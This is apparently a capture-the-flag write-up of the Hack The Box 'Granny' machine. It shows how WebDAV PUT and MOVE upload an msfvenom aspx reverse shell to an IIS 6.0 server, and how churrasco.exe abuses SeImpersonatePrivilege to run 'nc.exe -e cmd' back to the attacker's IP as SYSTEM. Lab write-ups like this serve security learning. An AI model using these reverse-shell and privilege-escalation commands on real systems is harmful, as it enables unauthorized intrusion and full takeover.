---
title: "Granny"
date: 2023-07-24T21:17:42+02:00
tags: ["windows","web","privesc"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Windows machine which has webDAV which allow us to put a reverse shell to gain RCE. We have privesc thanks to the SeImpersonatePrivilege which can be exploited with tools like churrasco or JuicyPotato."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Granny
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/granny

![Untitled](/HTB/granny-icon.png)

## Tools Used

- Nmap
- davtest
- cadaver/curl

## Port Scanning

```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Server Date: Fri, 21 Jul 2023 15:41:46 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_http-title: Under Construction
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan shows one unique open port serving a webpage, a Microsoft IIS httpd 6.0 (old version of IIS) can be a point of entry. We can see that is using webdav allowing us the use of a lot of useful methods like PUT and MOVE.

**WebDav**  is a set of extensions to the **Hypertext Transfer Protocol (HTTP**), which allows user agents to collaboratively author contents *directly* in an **HTTP web server** by providing facilities for concurrency control and namespace operations, thus allowing Web to be viewed as a *writeable, collaborative medium* and not just a read-only medium.

## Enumeration

Let’s take a look to the page in question

![Untitled](/HTB/granny-1.png)

![Untitled](/HTB/granny-2.png)

Nothing useful is displayed, only an under construction page.

Now let’s see if what type of files let us the dav to upload with the PUT option.

There is a tool called **davtest** which help us to perform a fast scan to see what are the allowed file extensions.

```bash

```

As we have **IIS**, it’s so probable is running aspx files, but the scan results shows that this type of files are not allowed with **PUT** option. Maybe we can put a file with an allowed extension to after that change his extension with **MOVE** option to aspx.

## Exploiting

First let’s create the reverse shell with msfvenom and change his extension to html (allowed extension) with mv.

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.20 LPORT=4444 -o reverse-shell.aspx
mv reverse-shell.aspx reverse-shell.html 
```

Let’s try to upload it with other tool called **cadaver** which help us to use the DAV options more easily (we can do the same with curl).

![Untitled](/HTB/granny-3.png)

Once uploaded the reverse-shell.html with PUT option, now let’s change the extension with MOVE.

![Untitled](/HTB/granny-4.png)

Now only need execute the reverse shell and put a listener to perform the attack.

```bash
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/granny-5.png)

We are as “nt authority\network service”.

I tried to acces to the user and admin directories but I am not allowed.

![Untitled](/HTB/granny-6.png)

![Untitled](/HTB/granny-7.png)

Taking a look at our privilege we can see some interesting privileges

```powershell
whoami /priv
```

```powershell
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

The SeImpersonatePrivilege allow us to use tools like [JuicyPotato](https://github.com/ohpe/juicy-potato) to privesc.

## Escalating Privilege

If we go to tested windows machines list which work with such exploit, we don’t see our system version `Microsoft(R) Windows(R) Server 2003, Standard Edition`.

![Untitled](/HTB/granny-8.png)

So we need to search an alternative exploit which do the same.

Searching on google I found a [blog](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/) which solve my problem.

The blog talks about churrasco exploit that is similar to [juicypotato](https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/)
exploit. That exploit is useful in some scenarios JuicyPotato exploit is not compatible with 
the older systems like Windows server 2003 or Windows XP.

Let’s send it with smbserver.py, first we need to perform the following command on the churrasco.exe directory.

```bash
smbserver.py smbFolder $(pwd) -smb2support
```

I always make a directory on the Temp directory of windows to avoid problems with the transfer.

Now let’s copy it.

```powershell
cd \Windows\Temp
mkdir PrivEsc
cd PrivEsc
copy \\10.10.14.20\smbFolder\churrasco.exe .
```

Before the run we need to put a command as an argument between two quotation marks.

```powershell
.\churrasco.exe "whoami"
```

![Untitled](/HTB/granny-10.png)

Now only rests to put a nc listener and send a reverse shell with nc, I put a smbserver.py on the nc.exe directory in order to execute the next payload to have a reverse shell.

```powershell
nc -lv 4445
```

```powershell
.\churrasco.exe "\\10.10.14.20\smbFolder\nc.exe -e cmd 10.10.14.20 4445"
```

![Untitled](/HTB/granny-9.png)

We are root users now.

### Flag(s)

**User’s flag**

![Untitled](/HTB/granny-11.png)

**Root’s flag**

![Untitled](/HTB/granny-12.png)

**Thank you for reading, and happy hacking! 😄**